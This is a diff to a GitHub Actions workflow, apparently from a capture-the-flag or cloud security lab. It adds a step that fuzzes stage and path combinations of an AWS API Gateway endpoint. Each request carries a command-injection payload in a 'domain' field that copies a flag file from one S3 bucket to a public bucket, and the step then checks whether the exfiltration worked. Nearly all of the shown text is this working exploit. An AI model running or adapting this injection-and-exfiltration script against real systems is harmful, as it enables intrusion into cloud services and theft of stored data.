@@ -97,6 +97,66 @@ jobs:
           echo "== Lambda function URL config =="
           aws lambda get-function-url-config --function-name nslookupv2 --output json || true
 
+      - name: Blindly exploit API Gateway command injection
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          api_base="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          public_bucket="platform-bucket-009661764077-us-east-1"
+          flag_bucket="codec4f26c862a321ef5"
+          out_key="faith-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}.txt"
+          exfil_url="s3://${public_bucket}/${out_key}"
+          command="example.com; /opt/aws s3 cp s3://${flag_bucket}/flag.txt ${exfil_url}; #"
+          encoded="$(python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "$command")"
+
+          stages=("" "prod" "default" "dev" "test" "v1" "api")
+          paths=("" "nslookup" "lookup" "dns" "resolve" "query")
+
+          check_flag() {
+            if aws s3api head-object --bucket "$public_bucket" --key "$out_key" >/dev/null 2>&1; then
+              echo "== Exfil succeeded: s3://${public_bucket}/${out_key} =="
+              aws s3 cp "s3://${public_bucket}/${out_key}" -
+              return 0
+            fi
+            return 1
+          }
+
+          try_url() {
+            local url="$1"
+            echo "== Trying $url =="
+
+            curl -ksS -m 8 -X POST \
+              -H 'content-type: application/json' \
+              --data "{\"domain\":\"${command}\"}" \
+              "$url" || true
+            echo
+            check_flag && exit 0
+
+            curl -ksS -m 8 "${url}?domain=${encoded}" || true
+            echo
+            check_flag && exit 0
+          }
+
+          for stage in "${stages[@]}"; do
+            for path in "${paths[@]}"; do
+              if [[ -n "$stage" && -n "$path" ]]; then
+                try_url "${api_base}/${stage}/${path}"
+              elif [[ -n "$stage" ]]; then
+                try_url "${api_base}/${stage}"
+              elif [[ -n "$path" ]]; then
+                try_url "${api_base}/${path}"
+              else
+                try_url "${api_base}"
+              fi
+            done
+          done
+
+          echo "== Exfil object not found after API fuzzing =="
+          aws s3api list-objects-v2 --bucket "$public_bucket" \
+            --query 'Contents[].{Key:Key,Size:Size,LastModified:LastModified}' \
+            --output table || true
+
       - name: Probe command injection
         shell: bash
         run: |
